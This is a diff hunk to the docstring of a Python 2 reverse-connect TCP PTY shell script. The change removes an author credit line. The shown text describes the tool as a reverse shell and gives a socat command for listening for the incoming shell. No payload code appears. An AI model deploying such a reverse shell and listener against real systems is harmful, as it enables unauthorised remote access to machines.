@@ -1,7 +1,6 @@
 #!/usr/bin/python2
 """
 Reverse Connect TCP PTY Shell - v1.0
-infodox - insecurety.net (2013)
 Gives a reverse connect PTY over TCP.
 For an excellent listener use the following socat command:
 socat file:`tty`,echo=0,raw tcp4-listen:PORT
